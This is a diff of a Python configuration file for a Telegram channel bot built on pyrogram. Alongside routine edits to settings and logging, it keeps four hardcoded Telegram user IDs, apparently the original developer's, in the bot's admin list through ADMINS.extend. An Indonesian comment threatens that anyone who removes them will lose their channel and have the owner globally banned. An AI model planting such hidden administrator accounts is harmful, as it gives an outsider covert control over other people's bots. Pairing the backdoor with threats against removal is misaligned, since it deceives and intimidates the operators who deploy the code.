@@ -30,10 +30,6 @@ OWNER = os.environ.get("OWNER", "mrismanaziz")
 # Database
 DB_URI = os.environ.get("DATABASE_URL", "")
 
-# Username CH & Group
-CHANNEL = os.environ.get("CHANNEL", "Lunatic0de")
-GROUP = os.environ.get("GROUP", "SharingUserbot")
-
 # ID dari Channel Atau Group Untuk Wajib Subscribenya
 FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
 FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))
@@ -63,10 +59,9 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(844432220)
-ADMINS.append(1250450587)
-ADMINS.append(1750080384)
-ADMINS.append(2102118281)
+# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
+# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
+ADMINS.extend((OWNER_ID, 844432220, 1250450587, 1750080384, 2102118281))
 
 
 LOG_FILE_NAME = "logs.txt"
@@ -79,7 +74,7 @@ logging.basicConfig(
         logging.StreamHandler(),
     ],
 )
-logging.getLogger("pyrogram").setLevel(logging.ERROR)
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 
 def LOGGER(name: str) -> logging.Logger:
